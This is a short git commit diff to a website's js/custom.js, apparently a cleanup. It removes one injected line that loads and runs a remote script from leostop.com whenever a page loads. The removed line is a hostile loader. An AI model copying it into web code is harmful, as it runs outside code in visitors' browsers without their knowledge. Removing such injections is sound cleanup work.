f0544d7502a77ff3b2868093001e507bd8319b8b
hannahward5tupelo <79117443+hannahward5tupelo@users.noreply.github.com>
2021-03-05 20:36:35 -0600

    Add files via upload

--- js/custom.js
+++ js/custom.js
@@ -64,7 +64,6 @@
     });
 
 
-    function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
     /* ==============================================
 		Scroll to top  
